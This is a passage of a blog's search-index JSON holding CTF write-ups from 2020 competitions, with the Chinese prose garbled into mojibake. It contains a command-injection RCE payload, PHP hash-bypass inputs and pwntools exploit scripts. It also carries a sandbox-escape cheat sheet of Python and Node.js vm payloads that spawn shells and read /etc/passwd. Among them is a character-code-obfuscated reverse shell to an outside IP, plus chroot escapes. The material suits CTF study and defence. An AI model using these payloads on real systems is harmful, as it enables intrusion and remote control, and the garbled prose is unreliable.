éœ€çŸ¥é“wmiåŒ…åŠå…¶å‡½æ•°ï¼ˆè®¾ç½®LCDèƒŒå…‰äº®åº¦ï¼‰çš„å«ä¹‰ï¼ŒNå’ŒBä¸¤å­—ç¬¦æ›¿æ¢ä¸º0å’Œ1ï¼Œè½¬16è¿›åˆ¶å†è½¬å­—ç¬¦ï¼Œç®€å•ç²—æš´ã€‚","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2020é¦–å±Šé’“é±¼åŸæ¯å›½é™…ç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›","slug":"match-2020é¦–å±Šé’“é±¼åŸæ¯å›½é™…ç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›","date":"2020-08-27T12:52:20.000Z","updated":"2020-08-27T13:41:24.217Z","comments":true,"path":"2020/08/27/match-2020é¦–å±Šé’“é±¼åŸæ¯å›½é™…ç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›/","permalink":"https://lazzzaro.github.io/2020/08/27/match-2020%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%E5%9B%BD%E9%99%85%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"â€‹ å†æ¬¡æ°´è¿‡çš„èµ›ï¼Œrank-110/382ã€‚ Miscç­¾åˆ°é¢˜ flag{Welcome_to_dycb} ç®€å•ç²—æš´ã€‚ â€‹ whitespace é™„ä»¶ï¼štest å†…å®¹ä¸€ç‰‡ç©ºç™½ï¼Œç¬¬ä¸€ååº”æƒ³åˆ°snowéšå†™ï¼Œç”¨snowå·¥å…·è§£å¯†å¾—æ— æ„ä¹‰å†…å®¹ã€‚ æ‹–åˆ°010editoræŸ¥çœ‹16è¿›åˆ¶ï¼Œå‘ç°ä¸‰ç§å­—ç¬¦0x20ã€0x09ã€0x0Aï¼Œå…¶ä¸­0x0Aæ•°é‡å°‘ä¸”æŒ‰ä¸€å®šé•¿åº¦å‡ºç°ï¼ŒçŒœæµ‹ä¸ºåˆ†éš”ç¬¦ï¼Œå›åˆ°textä¸­å°†0x20æ›¿æ¢ä¸º0ï¼Œ0x09æ›¿æ¢ä¸º1ï¼Œå†2è¿›åˆ¶è½¬å­—ç¬¦ï¼Œå¾—åˆ°flagã€‚ â€‹ Cryptoconfused_flag nc 119.3.45.222 9999 æ¯æ¬¡ncéƒ½æ˜¯ä¸åŒç»“æœï¼Œä½†å‡ºç°çš„å­—ç¬¦åŠæ•°é‡ä¸å˜ï¼Œåªæ˜¯ä¹±åºï¼Œæ­£ç¡®é¡ºåºèƒ½è¿˜åŸflagã€‚ æ …æ è§£å¯†æ— æœï¼Œå°è¯•å¾ªç¯å–1000æ¬¡å­—ç¬¦ä¸²ä»¥ç»Ÿè®¡å­—æ¯åœ¨ä¸åŒä½ç½®å‡ºç°çš„é¢‘æ¬¡ï¼ŒæŒ‰å¤§å°é¡ºåºä¾æ¬¡å–å¯¹åº”æ•°é‡å­—ç¬¦å¡«å…¥flagï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344#coding=utf-8from pwn import *#ç»Ÿè®¡å„å­—ç¬¦æ•°any_s=&#x27;flag&#123;beadfe08-7fee-3;dd9;961-b7efb21;9;65&#125;-d9;;8&#x27;dic=&#123;&#125;for i in any_s: if i not in dic: dic[i]=0 dic[i]+=1print(dic)s=[]flag=&#x27;?&#x27;*42#å¾ªç¯å–1000ä¸ªå­—ç¬¦ä¸²ç”¨äºç»Ÿè®¡for i in range(1000): print(i) try: r=remote(&#x27;119.3.45.222&#x27;,9999,timeout=2) s.append(r.recvline()) r.close() except: passdic2=&#123;&#125;for ss in s: for i in range(len(ss)): if ss[i] not in dic2: dic2[ss[i]]=&#123;&#125; if i not in dic2[ss[i]]: dic2[ss[i]][i]=0 dic2[ss[i]][i]+=1 for k,v in dic2.items(): if k.strip()!=&#x27;&#x27;: print((k,dic[k])) res=sorted(v.items(), key=lambda d:d[1], reverse = True) print(res[:dic[k]]) for j in dic[k]: flag[res[j][1]]=k print(flag)","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2020ç¬¬å››å±Šå¼ºç½‘æ¯å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›","slug":"match-2020ç¬¬å››å±Šå¼ºç½‘æ¯å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›","date":"2020-08-23T03:48:59.000Z","updated":"2020-08-27T12:50:44.767Z","comments":true,"path":"2020/08/23/match-2020ç¬¬å››å±Šå¼ºç½‘æ¯å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›/","permalink":"https://lazzzaro.github.io/2020/08/23/match-2020%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B/","excerpt":"","text":"â€‹ åˆç§°PWNæ¯ï¼Œé¢˜å‹åˆ†ç±»æ•°é‡ä¸¥é‡ä¸å‡ã€‚ä¸è®°å¥‡æ€ªçš„MIXåˆ†ç±»ã€å¼ºç½‘å…ˆé”‹ã€‘ï¼Œæ•°é‡ï¼šPWN=(Crypto+Misc)Ã—3ã€‚ æ²¡åšå‡ºå‡ é¢˜ï¼Œè’Ÿè’»ã€‚ Miscç­¾åˆ°ç®€å•ç²—æš´ã€‚ â€‹ å¼ºç½‘å…ˆé”‹ä¸»åŠ¨ http://39.96.23.228:10002 ç®€å•RCEã€‚ /?ip=127.0.0.1;ls åˆ—ç›®å½•å‘ç° flag.phpï¼› /?ip=127.0.0.1;cat flag.php æç¤º no flagï¼Œè¿‡æ»¤äº†å…³é”®å­— flagï¼› /?ip=127.0.0.1;a=ag.php;b=fl;cat $b$a ç»•è¿‡å…³é”®å­—ï¼ŒæŸ¥çœ‹æ³¨é‡Šæ‹¿åˆ°flagã€‚ â€‹ Funhash hash is really fun. http://39.101.177.96/ ç»•è¿‡å¥—å¨ƒã€‚ level 1 $_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;]) md4åŠ å¯†å‰åå­—ç¬¦ä¸²ç›¸ç­‰ï¼ŒPHPå¼±ç±»å‹æ¯”è¾ƒï¼Œæ˜“æƒ³åˆ°ç§‘å­¦è®¡æ•°æ³•è¡¨ç¤ºçš„0eå¼€å¤´å­—ç¬¦ä¸²å¯ç»•è¿‡ã€‚ å¯»æ‰¾æ»¡è¶³æ¡ä»¶çš„0eä¸²ï¼š 1234567891011121314151617$i = 0;$c = 0;while (true) &#123; if ((++$c % 1000000) == 0) &#123; printf(&quot;.&quot;); &#125; $n = &quot;0e&quot; . $i++; $h = hash(&#x27;md4&#x27;, $n); if ($n == $h) &#123; printf(&quot;\\nFound: $n\\n&quot;); break; &#125;&#125;//Found: 0e251288019 PAYLOAD1: hash1=0e251288019 level 2 $_GET[&#39;hash2&#39;] === $_GET[&#39;hash3&#39;] || md5($_GET[&#39;hash2&#39;]) !== md5($_GET[&#39;hash3&#39;]) éœ€è¦hash2å’Œhash3çš„å€¼ç›¸ç­‰ä¸”md5å€¼ä¸ç­‰ï¼Œå¼ºç±»å‹æ¯”è¾ƒï¼Œæ‰€ä»¥åªèƒ½ç”¨ç»å…¸æ•°ç»„æ–¹æ³•ç»•è¿‡ã€‚ md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULLï¼Œä¹Ÿå°±æ˜¯ç›¸ç­‰çš„ã€‚ PAYLOAD2: hash2[]=aaa&amp;hash3[]=bbb level 3 $query = &quot;SELECT * FROM flag WHERE password = &#39;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#39;&quot;; md5(string,raw) string å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚raw å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼šTRUE - åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼›FALSE - é»˜è®¤ï¼Œ32 å­—ç¬¦åå…­è¿›åˆ¶æ•°ã€‚ å¯»æ‰¾ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶md5å€¼çš„16å­—ç¬¦äºŒè¿›åˆ¶å½¢å¼èƒ½ä½¿ WHERE éƒ¨åˆ†ä¸ºçœŸï¼Œç”¨ç»å…¸ç»•è¿‡å­—ç¬¦ä¸²ffifdyopï¼Œç»è¿‡md5å‡½æ•°åç»“æœä¸º &#39;or&#39;6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bã€‚ PAYLOAD3: hash4=ffifdyop â€‹ upload é™„ä»¶ï¼šdata.pcapng WiresharkæŸ¥çœ‹æµé‡åŒ…ï¼Œå‘ç°steghide.phpï¼Œå†…å«ä¸€å¼ jpgå›¾ï¼Œå¯¼å‡ºå¹¶è¿˜åŸ æ ¹æ®æ–‡ä»¶åsteghideæç¤ºï¼Œsteghideéšå†™ï¼Œå‘½ä»¤ä¸€æŠŠæ¢­ï¼Œå¯†ç ä¸ºå¼±å¯†ç 123456ï¼š steghide extract -sf steghide.jpg -p 123456 â€‹ bank nc 39.101.134.52 8005 hint: powçš„å­—ç¬¦é›†ä¸ºå¤§å°å†™å­—æ¯+æ•°å­— ncäº¤äº’é¢˜ï¼Œè¿‡äº†sha256è®¤è¯åï¼Œè¾“å…¥åå­—ï¼š å¯ä»¥å‘ç°åˆå§‹cash=10ï¼Œè€Œget flagéœ€è¦cash=1000ã€‚ transactå¯ä»¥ä¸ä»»ä¸€ç”¨æˆ·äº¤æ˜“cashï¼Œview recordså¯ä»¥æŸ¥çœ‹äº¤æ˜“å€¼å¤§äº100çš„è®°å½•ï¼Œprovide a record æä¾›äº¤æ˜“è®°å½•ï¼Œhintå‘ç°äº¤æ˜“åŠ å¯†æ–¹å¼ä¸ºECBï¼ŒåŠ å¯†å†…å®¹ä¸ºå‘é€è€…+æ¥æ”¶è€…+äº¤æ˜“å€¼ã€‚ æ—¢ç„¶éœ€è¦ä»cash=10å¢åŠ åˆ°cash=1000ï¼Œç”±äºtransactçš„äº¤æ˜“é¢æ²¡æœ‰ä»»ä½•é™åˆ¶ï¼Œé‚£ä¹ˆäº¤æ˜“è´Ÿå€¼å²‚ä¸å¯ä»¥ä»ä»»ä¸€ç”¨æˆ·å¤„å¾—åˆ°cashï¼Ÿå°è¯•å‘ç°å±…ç„¶å¯è¡Œï¼Œç›´æ¥éé¢„æœŸæ‹¿åˆ°flagï¼Œç¥å¥‡ä¸‰è¡€â€¦â€¦ 12345678910111213141516171819202122232425from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport stringfrom hashlib import sha256def brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=3)r = remote(&quot;39.101.134.52&quot;,8005)data = r.recvline()prefix, s = parse(&quot;sha256(XXX+&#123;&#125;) == &#123;&#125;&quot;,data)r.recvuntil(&#x27;Give me XXX:&#x27;)r.sendline(brute_force(prefix,s))r.recvuntil(&#x27;teamtoken:&#x27;)r.sendline(&#x27;icq109e2eff64d5d38cd2a0191b42cff&#x27;)r.recvuntil(&#x27;give me your name:&#x27;)r.sendline(&#x27;ssss&#x27;)r.recvuntil(&#x27;&gt;&#x27;)r.sendline(&#x27;transact&#x27;)r.recvuntil(&#x27;&gt;&#x27;)r.sendline(&#x27;ttt -1000&#x27;)r.recvuntil(&#x27;&gt;&#x27;)r.sendline(&#x27;get flag&#x27;)print(r.recvall())","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"æ²™ç›’é€ƒé€¸","slug":"misc-æ²™ç›’é€ƒé€¸","date":"2020-08-21T12:00:36.000Z","updated":"2023-10-07T16:42:01.582Z","comments":true,"path":"2020/08/21/misc-æ²™ç›’é€ƒé€¸/","permalink":"https://lazzzaro.github.io/2020/08/21/misc-%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/","excerpt":"","text":"â€‹ æ²™ç›’é€ƒé€¸ / æ²™ç®±é€ƒé€¸æ²™ç®±é€ƒé€¸ï¼Œå°±æ˜¯åœ¨ç»™æˆ‘ä»¬çš„ä¸€ä¸ªä»£ç æ‰§è¡Œç¯å¢ƒä¸‹ï¼ˆOjæˆ–ä½¿ç”¨socatç”Ÿæˆçš„äº¤äº’å¼ç»ˆç«¯ï¼‰ï¼Œè„±ç¦»ç§ç§è¿‡æ»¤å’Œé™åˆ¶ï¼Œæœ€ç»ˆæˆåŠŸæ‹¿åˆ°shellæƒé™çš„è¿‡ç¨‹ã€‚ Python / Pyjailå†…ç½®å‡½æ•°/å˜é‡123456789101112dir() #ä¸å¸¦å‚æ•°æ—¶,è¿”å›å½“å‰èŒƒå›´å†…çš„å˜é‡ã€æ–¹æ³•å’Œå®šä¹‰çš„ç±»å‹åˆ—è¡¨ï¼›å¸¦å‚æ•°æ—¶,è¿”å›å‚æ•°çš„å±æ€§ã€æ–¹æ³•åˆ—è¡¨globals() #å…¨å±€å˜é‡locals() #å±€éƒ¨å˜é‡chr()/ord() #å­—ç¬¦ä¸ASCIIç è½¬æ¢open() #è¯»æ–‡ä»¶input() #è¾“å…¥__import__() #è½½å…¥æ¨¡å—__builtins__ #åŒ…å«å½“å‰è¿è¡Œç¯å¢ƒä¸­é»˜è®¤çš„æ‰€æœ‰å‡½æ•°ä¸ç±»__file__ #è¯¥å˜é‡æŒ‡ç¤ºå½“å‰è¿è¡Œä»£ç æ‰€åœ¨è·¯å¾„__class__ #å½“å‰å¯¹è±¡æ‰€å±çš„ç±»ï¼Œå¦‚&#x27;&#x27;.__class__ä¼šè¿”å›&lt;class &#x27;str&#x27;&gt;__base__ #å½“å‰ç±»çš„åŸºç±»ï¼Œå¦‚str.__base__ä¼šè¿”å›&lt;class &#x27;object&#x27;&gt;__doc__ #ç±»çš„å¸®åŠ©æ–‡æ¡£ï¼Œé»˜è®¤ç±»å‡æœ‰å¸®åŠ©æ–‡æ¡£ æ¨¡å—1234567891011121314151617181920#osimport osos.system(&#x27;dir&#x27;)os.popen(&#x27;dir&#x27;).read()#platformimport platformplatform.popen(&#x27;dir&#x27;).read()platform.os.system(&#x27;dir&#x27;)#timeitimport timeittimeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;)#sysfrom sys import modulesmodules[&#x27;os&#x27;].system(&#x27;sh&#x27;)modules[&#x27;posix&#x27;].system(&#x27;sh&#x27;)sys._getframe().f_locals.values() import1234__import__(&#x27;os&#x27;).system(&#x27;sh&#x27;)__builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;sh&#x27;)(lambda: __import__(&#x27;os&#x27;).system(&#x27;sh&#x27;))()(__builtins__:=__import__(&#x27;os&#x27;))and(lambda:system)()(&#x27;sh&#x27;) é‡è½½æ¨¡å— / é‡æ–°å¼•å…¥1234567891011#å¾—åˆ°å®Œæ•´__builtin__æ¨¡å—reload(__builtin__)import impimp.reload(__builtin__)#é‡æ–°å¼•å…¥osimport syssys.modules[&#x27;os&#x27;]=&#x27;/usr/lib/python2.7/os.py&#x27;execfile(&#x27;/usr/lib/python2.7/os.py&#x27;) disæ¨¡å—è§£æ1234#dis.code_infoé™åˆ¶namesæ•°é‡__getattribute__ = (None).__getattribute__(&#x27;__class__&#x27;);__getattribute__ = __getattribute__.__getattribute__(__getattribute__, &#x27;__base__&#x27;);__getattribute__.__getattribute__(__getattribute__.__getattribute__(__getattribute__.__getattribute__(__getattribute__, &#x27;__subclasses__&#x27;)()[84](), &#x27;load_module&#x27;) (&#x27;os&#x27;), &#x27;system&#x27;) (&#x27;sh&#x27;) å‡½æ•°è°ƒç”¨ / å‘½ä»¤æ‰§è¡Œ / äº¤äº’1234567891011121314151617181920212223242526272829303132#å±æ€§/å­—å…¸getattr(__import__(&#x27;os&#x27;),&#x27;system&#x27;)(&#x27;dir&#x27;)__import__(&#x27;os&#x27;).__getattribute__(&#x27;system&#x27;)(&#x27;dir&#x27;)__import__(&#x27;os&#x27;).__dict__.__getitem__(&#x27;system&#x27;)(&#x27;dir&#x27;)#os._wrap_closeç±»().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#x27;system&#x27;](&#x27;sh&#x27;) #objectç±» - warnings.WarningMessageç±»().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].__dict__[&#x27;system&#x27;](&#x27;ls&#x27;)().__class__.__base__.__subclasses__()[137].__init__.__globals__[&#x27;system&#x27;](&quot;sh&quot;)#help()å‡½æ•°#å‚è€ƒ#https://cheatsheet.haax.fr/linux-systems/programing-languages/python/#pyjail-generate-a-shell#https://blog.maple3142.net/2021/07/05/0CTF-2021-quals-writeups/#pypypypy#https://satoooon1024.hatenablog.com/entry/2021/12/15/SECCON_CTF_2021_Writeup#misc-hitchhike-16-solves#https://ptr-yudai.hatenablog.com/entry/2021/12/19/232158#Misc-227pts-hitchhike#http://tttang.com/archive/1428/#toc_0x03-2seccon-2021-hitchhikehelp() =&gt; os =&gt; !shhelp() =&gt; __main__help() =&gt; [filename]#è°ƒè¯•å™¨#pdbæ¨¡å—å®šä¹‰äº†ä¸€ä¸ªäº¤äº’å¼æºä»£ç è°ƒè¯•å™¨ï¼Œç”¨äºPythonç¨‹åºã€‚å®ƒæ”¯æŒåœ¨æºç è¡Œé—´è®¾ç½®ï¼ˆæœ‰æ¡ä»¶çš„ï¼‰æ–­ç‚¹å’Œå•æ­¥æ‰§è¡Œï¼Œæ£€è§†å †æ ˆå¸§ï¼Œåˆ—å‡ºæºç åˆ—è¡¨ï¼Œä»¥åŠåœ¨ä»»ä½•å †æ ˆå¸§çš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä»»æ„Pythonä»£ç ã€‚å®ƒè¿˜æ”¯æŒäº‹åè°ƒè¯•ï¼Œå¯ä»¥åœ¨ç¨‹åºæ§åˆ¶ä¸‹è°ƒç”¨ã€‚breakpoint()#_posixsubprocess.fork_exec#ä¸åŒçš„pythonç‰ˆæœ¬çš„_posixsubprocess.fork_execæ¥å—çš„å‚æ•°ä¸ªæ•°ä¸ä¸€æ ·#å‚è€ƒhttps://ctftime.org/writeup/31883import os__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) æ–‡ä»¶è¯»å–123456open(&#x27;1.txt&#x27;).read()#objectç±»().__class__.__base__.__subclasses__()[40](&quot;1.txt&quot;).read()().__class__.__bases__[0].__subclasses__()[40](&quot;1.txt&quot;).read()&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](&quot;1.txt&quot;).read() å…³é”®å­—è¿‡æ»¤123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&#x27;sys&#x27;+&#x27;tem&#x27; =&gt; &#x27;system&#x27;&#x27;X19pbXBvcnRfXw==&#x27;.decode(&#x27;base64&#x27;) =&gt; &#x27;__import__&#x27;&#x27;&#x27;.join([&#x27;__imp&#x27;,&#x27;ort__&#x27;]) =&gt; &#x27;__import__&#x27;&#x27;__tropmi__&#x27;[::-1] =&gt; &#x27;__import__&#x27;&#x27;__imp&#x27;+&#x27;ort__&#x27; =&gt; &#x27;__import__&#x27;&#x27;__buihf9ns__&#x27;.replace(&#x27;hf9&#x27;,&#x27;ldi&#x27;) =&gt; &#x27;__buildins__&#x27;dir()[0] =&gt; &#x27;_&#x27;eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)) =&gt; __import__(&quot;os&quot;)bytes([46, 47, 102, 108, 97, 103]).decode() =&gt; &#x27;./flag&#x27;import codecsgetattr(os,codecs.encode(&quot;flfgrz&quot;,&#x27;rot13&#x27;))(&#x27;ifconfig&#x27;)#unicodeå­—ç¬¦ / Non-ASCII Identifies# ğŸğŸğŸğŸ‘ğŸ’ğŸ“ğŸ”ğŸ•ğŸ–ğŸ—ğšğ›ğœğğğŸğ ğ¡ğ¢ğ£ğ¤ğ¥ğ¦ğ§ğ¨ğ©ğªğ«ğ¬ğ­ğ®ğ¯ğ°ğ±ğ²ğ³# ğŸ˜ğŸ™ğŸšğŸ›ğŸœğŸğŸğŸŸğŸ ğŸ¡ğ•’ğ•“ğ•”ğ••ğ•–ğ•—ğ•˜ğ•™ğ•šğ•›ğ•œğ•ğ•ğ•Ÿğ• ğ•¡ğ•¢ğ•£ğ•¤ğ•¥ğ•¦ğ•§ğ•¨ğ•©ğ•ªğ•«#æ¸…ç©ºsetattr(__import__(&quot;__main__&quot;), &quot;blacklist&quot;, list())#è¿‡æ»¤evalexec(&quot;import os;os.system(&#x27;curl xxx&#x27;)&quot;)#è¿‡æ»¤æ•°å­—0=False1=True2=True+True=True-(-True)3=True+True+True=True-(-True)-(-True)#è¿‡æ»¤request#å­—ç¬¦ä¸²request:list(globals().keys())[11]#requestå€¼ï¼šglobals()[list(globals().keys())[11]]#è¿‡æ»¤å¼•å·chr(123)str()#å­—ç¬¦ä¸²è¿æ¥&#x27;&#x27;.join([&#x27;a&#x27;,&#x27;b&#x27;])#ç›²æ³¨time.sleep(3) if open(&#x27;/flag&#x27;).read()[0]==&#x27;c&#x27; else 1flag.index(&#x27;flag&#123;...&#x27;)type(flag.split())(type(flag.split())(flag).pop(&#123;..&#125;).encode()).remove(&#123;..&#125;)#å…¶ä»–æŠ€å·§eval(input())breakpoint() #è°ƒè¯•æ¨¡å¼help()(lambda:os.system(&#x27;/bin/sh&#x27;))()(__builtins__:=__import__(&#x27;os&#x27;))and(lambda:system)()(&#x27;sh&#x27;) #è¿‡æ»¤ç‚¹setattr(copyright,&#x27;__dict__&#x27;,globals()),delattr(copyright,&#x27;breakpoint&#x27;),breakpoint()#ä¿®é¥°ç¬¦@exec@inputclass A: pass æ³¨é‡Šé€ƒé€¸Python ä¸­çš„ç¼–è§£ç å™¨ raw_unicode_escape å…è®¸Pythonæ–‡ä»¶è§£é‡ŠUnicodeç¼–ç çš„å­—ç¬¦ï¼Œä½¿ç”¨ raw_unicode_escape ç¼–ç å™¨å°† \\uxxxx è§£é‡Šæˆå¯¹åº”çš„ASCIIå­—ç¬¦ï¼Œæ¯”å¦‚æ¢è¡Œç¬¦ \\u000a ï¼Œè¿™æ ·å¯ä»¥åœ¨ Python çš„æ³¨é‡Šä¸­éšè—æ¶æ„ä»£ç ã€‚ 12345#!/usr/bin/env python# -*- coding: raw_unicode_escape -*-#\\u000aimport os#\\u000aos.system(&quot;ls /&quot;)#\\u000aos.system(&quot;cat /flag&quot;) å‚è€ƒï¼š [PyJail] pythonæ²™ç®±é€ƒé€¸æ¢ç©¶Â·æ€»è§ˆ evalå˜é‡è¦†ç›–12345# a=&#123;&#x27;test&#x27;:0&#125; =&gt; a=&#123;&#x27;test&#x27;:1&#125;[[str][0]for[a[&#x27;test&#x27;]]in[[1]]]#ç¯å¢ƒå˜é‡[[str][0]for[os.environ[&#x27;test&#x27;]]in[[&#x27;xxx&#x27;]]] â€‹ node.jså‰ç«¯åœ¨å‰ç«¯ä¸­ï¼Œå¯èƒ½ä¼šä½¿ç”¨åˆ é™¤ eval ï¼Œé‡å†™ Function.prototype.constructor / GeneratorFunction / AsyncFunction ç­‰æ–¹å¼æ¥å®Œæˆå‰ç«¯çš„æ²™ç®±ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨åˆ›å»ºä¸€ä¸ªæ–°iframeçš„æ–¹å¼æ¥è·å–æ–°çš„æ‰§è¡Œç¯å¢ƒã€‚ æœåŠ¡ç«¯JavaScriptæä¾›äº†åŸç”Ÿçš„vmæ¨¡å—ï¼Œç”¨äºéš”ç¦»äº†ä»£ç ä¸Šä¸‹æ–‡ç¯å¢ƒã€‚ä½†æ˜¯åœ¨è¯¥ç¯å¢ƒä¸­ä¾ç„¶å¯ä»¥è®¿é—®æ ‡å‡†çš„JavaScript APIå’Œå…¨å±€çš„NodeJSç¯å¢ƒã€‚ åœ¨åŸç”Ÿçš„æ²™ç®±æ¨¡å—ä¸­ï¼Œå¸¸ç”¨çš„é€ƒé€¸æ–¹å¼ä¸ºï¼š 12345678const sandbox = &#123;&#125;;const whatIsThis = vm.runInNewContext(` const ForeignObject = this.constructor; const ForeignFunction = ForeignObject.constructor; const process = ForeignFunction(&quot;return process&quot;)(); const require = process.mainModule.require; require(&quot;fs&quot;);`, sandbox); ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨Contextä¸‹è¿è¡Œçš„ä»£ç åº”è¯¥åªå±äºè¯¥éš”ç¦»ç¯å¢ƒã€‚ç„¶è€Œï¼Œthisæ˜¯ä¸€ä¸ªç‰¹åˆ«çš„ï¼ŒthisæŒ‡å‘runInContext(line, context)è¿™ä¸€å¥é‡Œçš„contextå˜é‡ï¼Œå®ƒå±äºæ²™ç›’å¤–ï¼Œå®é™…ä¸Šï¼Œå®ƒæ˜¯ä¸€ä¸ª&#123;&#125;ã€‚ 1234567891011//åˆ—ç›®å½•this.constructor.constructor(&#x27;return this.process.binding&#x27;)()(&#x27;fs&#x27;).readdir(&#x27;/&#x27;,function (err, data) &#123;data&#125;)//è¯»æ–‡ä»¶this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&quot;fs&quot;).readFileSync(&quot;/etc/passwd&quot;).toString()//å‘½ä»¤æ‰§è¡Œ&quot; &quot;.toString.constructor(&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /etc/passwd&#x27;).toString()&quot;)()const &#123;spawnSync&#125; = this.constructor.constructor(&quot;return process&quot;)().mainModule.require(&#x27;child_process&#x27;) spawnSync(&#x27;cat /flag&#x27;, [], &#123;stdio: &#x27;inherit&#x27;&#125;); è€ƒè™‘åˆ°JavaScriptåŸç”Ÿvmæ¨¡å—çš„ç¼ºé™·ï¼Œæœ‰å¼€å‘è€…è®¾è®¡äº†vm2æ¥æä¾›ä¸€ä¸ªæ›´å®‰å…¨çš„éš”ç¦»ç¯å¢ƒï¼Œä½†æ˜¯åœ¨æ—§ç‰ˆæœ¬ä¸­åŒæ ·å­˜åœ¨ä¸€äº›é€ƒé€¸æ–¹å¼ï¼Œä¾‹å¦‚ï¼š 12345vm.runInNewContext( &#x27;Promise.resolve().then(()=&gt;&#123;while(1)console.log(&quot;foo&quot;, Date.now());&#125;); while(1)console.log(Date.now())&#x27;, &#123;console:&#123;log()&#123;console.log.apply(console,arguments);&#125;&#125;&#125;, &#123;timeout:5&#125;); ç»•è¿‡ ç‚¹ . åˆ©ç”¨withç»•è¿‡ã€‚ 1with(String)with(f=fromCharCode,this)with(constructor)with(constructor(f(r=114,e=101,t=116,117,r,110,32,p=112,r,111,c=99,e,s=115,s))())with(mainModule)with(require(f(c,h=104,105,108,100,95,p,r,111,c,e,s,s)))exec(f(98,97,s,h,32,45,c,32,34,98,97,s,h,32,45,105,32,62,38,32,47,100,e,118,47,t,c,p,47,a=56,b=49,46,54,a,46,b,50,48,46,b,52,47,a,a,a,57,32,48,62,38,b,34)) å¼•å· ä½¿ç”¨Stringçš„fromCharCodeé€šè¿‡ASCIIç å€¼æ„é€ ã€‚ å‚è€ƒSSTI (Server Side Template Injection) â€‹ chrootchrooté€ƒé€¸çš„æ ¸å¿ƒæ˜¯ä½¿è¿›ç¨‹ä¸­å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ï¼Œå¤„äºæ ¹ç›®å½•æ ‘ä¹‹å¤–ã€‚ å‚è€ƒï¼šIâ€™M IN CHROOT JAIL, GET ME OUT OF HERE! mount1234mount /dev/sda1 /tmpcd /tmpcd /tmp/bin./cat /tmp/etc/passwd /proc12ls /proc/*/rootcd /proc/[PID]/root æ¸…ç©ºenvæŸ¥çœ‹envå¯ä»¥å‘ç°ï¼Œæœ‰ä¸ªå¥‡æ€ªçš„å˜é‡ï¼šLD_PRELOAD=libfakechroot.soï¼Œå®ƒæ˜¯ä¸€ä¸ªç”¨äºåœ¨ç”¨æˆ·æƒé™ä¸‹æ›´æ”¹rootç›®å½•çš„å·¥å…·ã€‚ åªè¦æŠŠè¿™ä¸ªç¯å¢ƒå˜é‡ç»™åˆ æ‰ï¼šenv LD_PRELOAD=/bashï¼Œå°±åœ¨çœŸæ­£çš„rootä¸­äº†ã€‚ å¯æ‰§è¡Œç¨‹åº123cat &lt;&lt; EOF &gt; getmeoutofhere.c[å†…å®¹]EOF C 123456789101112131415161718192021222324// Shortened version of this:// 